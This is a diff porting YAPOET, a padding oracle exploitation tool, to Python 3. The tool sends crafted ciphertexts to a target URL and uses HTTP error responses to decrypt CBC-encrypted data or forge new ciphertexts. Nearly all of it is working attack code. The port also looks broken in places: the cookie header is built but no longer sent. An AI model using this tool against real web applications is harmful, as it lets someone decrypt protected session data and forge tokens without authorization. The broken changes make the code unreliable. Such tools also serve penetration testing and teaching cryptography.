@@ -3,11 +3,13 @@
 import errno
 import optparse
 import random
-import urllib
-import urllib2
+import urllib.error
+import urllib.parse
+import urllib.request
 
 
 class Yapoet:
+
     def __init__(self, url, post_data, cookie, block_size, iv, mode, encode_func, decode_func):
         self._url = url
         self._post_data = post_data
@@ -21,21 +23,21 @@ class Yapoet:
 
     def _is_valid_padding(self, encrypted_data):
         specify = lambda s: s.replace("%encrypted_data%",
-                                      urllib.quote(self._encode_func(encrypted_data))) if s else None
+                                      urllib.parse.quote(self._encode_func(encrypted_data))) if s else ''
         url = specify(self._url)
-        post_data = specify(self._post_data)
-        cookie = specify(self._cookie)
+        post_data = specify(self._post_data).encode()
+        cookies = urllib.parse.urlencode({"Cookie": specify(self._cookie)}).encode()
         try:
             self._requests_count += 1
-            urllib2.urlopen(urllib2.Request(url, post_data, {"Cookie": cookie}))
+            urllib.request.urlopen(urllib.request.Request(url, post_data))
             return True
-        except urllib2.HTTPError:
+        except urllib.error.HTTPError:
             return False
-        except urllib2.URLError:
-            print "\n\nERROR: host is unreachable"
+        except urllib.error.URLError:
+            print("\n\nERROR: host is unreachable")
             exit(errno.EHOSTUNREACH)
 
-    def _decrypt_block(self, encrypted_block):
+    def _decrypt_block_cbc(self, encrypted_block):
         probing_bytes = bytearray(b'\0' * self._block_size + encrypted_block)
         intermediate_bytes = bytearray(b'\0' * self._block_size)
         byte_index = self._block_size - 1
@@ -49,57 +51,69 @@ class Yapoet:
                 probes_count += 1
                 if self._is_valid_padding(probing_bytes):
                     intermediate_bytes[byte_index] = probing_bytes[byte_index] ^ padding_size
-                    print "%s," % hex(intermediate_bytes[byte_index]),
+                    print("%s," % hex(intermediate_bytes[byte_index]), end=' ')
                     break
                 else:
-                    probing_bytes[byte_index] = probing_bytes[byte_index] + 1 if probes_count != 255 else 0
+                    if probing_bytes[byte_index] == 0:
+                        print("can't decrypt block")
+                        return None
+                    probing_bytes[byte_index] = probing_bytes[byte_index] + 1 if probing_bytes[byte_index] != 255 else 0
             byte_index -= 1
         return intermediate_bytes
 
-    def decrypt_text(self, encrypted_data):
+    def decrypt_text_cbc(self, encrypted_data):
         self._requests_count = 0
         encrypted_bytes = self._decode_func(encrypted_data)
         decrypted_data = ''
         block_index = len(encrypted_bytes) - self._block_size
         while block_index >= 0:
-            print "\n\t\tProcessing block #%s:" % (block_index / self._block_size),
+            print("\n\tProcessing block #%s:" % int(block_index / self._block_size), end=' ')
             cipher_block = encrypted_bytes[block_index: block_index + self._block_size]
             if block_index > 0:
                 prev_block = encrypted_bytes[block_index - self._block_size: block_index]
             else:
                 prev_block = self._iv
-            decrypted_block = self._decrypt_block(cipher_block)
+            decrypted_block = self._decrypt_block_cbc(cipher_block)
+            if decrypted_block == None:
+                return None
             for idx, val in enumerate(decrypted_block):
                 decrypted_data = chr(val ^ prev_block[idx] if self._mode == "CBC" else val) + decrypted_data
             block_index -= self._block_size
-        return decrypted_data[::-1].rstrip(decrypted_data[0]), self._requests_count
+        return str(decrypted_data[::-1].rstrip(decrypted_data[0])), self._requests_count
 
-    def _encrypt_block(self, plain_block, iv):
+    def _encrypt_block_cbc(self, plain_block, iv):
         encrypted_block = bytearray(b'\0' * self._block_size)
-        for idx, val in enumerate(self._decrypt_block(iv)):
-            encrypted_block[idx] = val ^ plain_block[idx]
-        return encrypted_block
+        decrypted_block = self._decrypt_block_cbc(iv)
+        if decrypted_block != None:
+            for idx, val in enumerate(decrypted_block):
+                encrypted_block[idx] = val ^ plain_block[idx]
+            return encrypted_block
+        else:
+            print("can't encrypt block")
+            return None
 
-    def encrypt_text(self, plain_data):
+    def encrypt_text_cbc(self, plain_data):
         self._requests_count = 0
         padding_length = self._block_size - len(plain_data) % self._block_size
         padded_data = plain_data.encode() + bytearray([padding_length] * padding_length)
         encrypted_text = bytearray()
         block_index = len(padded_data) - self._block_size
-        iv = bytearray(random.getrandbits(8) for _ in xrange(self._block_size))
+        iv = bytearray(random.getrandbits(8) for _ in range(self._block_size))
         while block_index >= 0:
-            print "\n\t\tProcessing block #%s:" % (block_index / self._block_size),
+            print("\n\tProcessing block #%s:" % int(block_index / self._block_size), end=' ')
             encrypted_text = iv + encrypted_text
-            iv = self._encrypt_block(padded_data[block_index: block_index + self._block_size], iv)
+            iv = self._encrypt_block_cbc(padded_data[block_index: block_index + self._block_size], iv)
+            if iv == None:
+                return None
             block_index -= self._block_size
-        return self._encode_func(iv + encrypted_text), self._requests_count
+        return self._encode_func(iv + encrypted_text).decode(), self._requests_count
 
 
 if __name__ == "__main__":
 
-    print "YAPOET: Yet Another Padding Oracle Exploitation Tool v0.2.1"
-    print "by Vladimir Kochetkov <kochetkov.vladimir@gmail.com>"
-    print "https://github.com/kochetkov/Yapoet\n"
+    print("YAPOET: Yet Another Padding Oracle Exploitation Tool v0.3.0")
+    print("by Vladimir Kochetkov <kochetkov.vladimir@gmail.com>")
+    print("https://github.com/kochetkov/Yapoet\n")
 
     parser = optparse.OptionParser()
     parser.add_option("-u", "--url", dest="url",
@@ -128,29 +142,36 @@ if __name__ == "__main__":
         if options.iv:
             options_iv = bytearray([int(i, 0) for i in options.iv.split(",")])
             if len(options_iv) != options.block_size:
-                print "IV length must be equal to the BLOCK_SIZE value"
+                print("IV length must be equal to the BLOCK_SIZE value")
                 exit(errno.EINVAL)
         else:
             options_iv = bytearray(b'\0' * options.block_size)
         if options.mode != "CBC":
-            print "Possible value for MODE is only \"CBC\""
+            print("Possible value for MODE is only \"CBC\"")
             exit(errno.EINVAL)
         poet = Yapoet(options.url, options.post_data, options.cookie, options.block_size, options_iv, options.mode,
                       eval(options.encode_func), eval(options.decode_func))
-        print "Using %s mode of operation, block size = %s bytes and IV = %s\n" % (
-            options.mode, options.block_size, ''.join('{:02x}'.format(x) for x in options_iv))
+        print("Using %s mode of operation, block size = %s bytes and IV = %s\n" % (
+            options.mode, options.block_size, ''.join('{:02x}'.format(x) for x in options_iv)))
         if options.encrypted_data:
-            print "Started decryption of '''%s'''" % options.encrypted_data
-            print "\n\nData has been decrypted to '''%s''' via %s requests\n" % poet.decrypt_text(
-                options.encrypted_data)
+            print("Started decryption of '''%s'''" % options.encrypted_data)
+            result = poet.decrypt_text_cbc(options.encrypted_data)
+            if result != None:
+                print("\n\nData has been decrypted to '''%s''' via %s requests\n" % result)
+            else:
+                print("\n\n\Data were not decrypted: unexploitable or missing oracle")
         if options.plaintext_data:
             if options.mode != "CBC":
-                print "Encryption is possible only in CBC mode"
+                print("Encryption is possible only in CBC mode")
                 exit(errno.EINVAL)
-            print "Started encryption of '''%s'''" % options.plaintext_data
-            print "\n\nData has been encrypted to '''%s''' via %s requests" % poet.encrypt_text(options.plaintext_data)
+            print("Started encryption of '''%s'''" % options.plaintext_data)
+            result = poet.encrypt_text_cbc(options.plaintext_data)
+            if result != None:
+                print("\n\nData has been encrypted to '''%s''' via %s requests" % result)
+            else:
+                print("\n\n\Data were not encrypted: unexploitable or missing oracle")
     else:
         parser.print_help()
-        print "\nPlease note that the value of at least one of the HTTP-request parameters in\n" \
-              "the URL, POST_DATA or COOKIE options should be replaced with an\n" \
-              "%encrypted_data% placeholder."
+        print("\nPlease note that the value of at least one of the HTTP-request parameters in\n"
+              "the URL, POST_DATA or COOKIE options should be replaced with an\n"
+              "%encrypted_data% placeholder.")
